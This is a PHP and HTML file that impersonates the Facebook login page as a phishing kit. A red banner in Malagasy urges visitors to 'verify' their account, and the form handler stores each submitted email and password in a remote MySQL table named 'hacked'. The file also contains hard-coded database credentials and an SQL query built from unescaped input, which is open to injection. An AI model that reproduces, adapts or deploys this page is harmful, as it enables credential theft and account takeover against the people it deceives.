
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="stylesheet" href="default.css">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login">
        <div class="container">
            <div class="row">
                <div class="col-7">
                    <div class="align-center">
                        <div class="content">
                            <img src="img/fb.png" alt="">
                            <p>Facebook helps you connect and share with the people in your life.</p>
                        </div>
                    </div>
                </div>
                <div class="col-5 col-xs-12">
                    
                        <div class="login-form">
                            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                                <input id="email" type="text" name="email" placeholder="Email address or phone number"><br>
                                <input id="password" name="password" type="password" placeholder="Password"><br>
                                <input id="login-btn" type="submit" value="Log In"><br>
                                <a href="#">Forgotten password?</a><br>
                                <button id="create-btn">Create New Account</button><br>
                            </form>
                        </div>
                        <footer>
                            <a href="#" 
                            style="font-weight: bold;
                            color: var(--black);
                            text-decoration: none;">Create a Page</a> 
                            for a celebrity, band or business.

                            <h1 style="color: red;">Hamarino ny kaonty facebook mba ahafahana manohy .</h1>
                        </footer>
                    
                </div>
            </div>
        </div>
    </div>
</body>
</html>
<?php
$servername = "mysql-tsilavina.alwaysdata.net";
$username = "tsilavina";
$password = "tsilavina2610tsilavina2610";
$dbname = "tsilavina_2610";

// Créer une connexion
$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Récupérer les données du formulaire et échapper les caractères spéciaux
$email = $_POST['email'];
$password = $_POST['password'];

// Construire la requête SQL en insérant directement les valeurs
$sql = "INSERT INTO hacked (email, password) VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Fermer la connexion
$conn->close();
?>
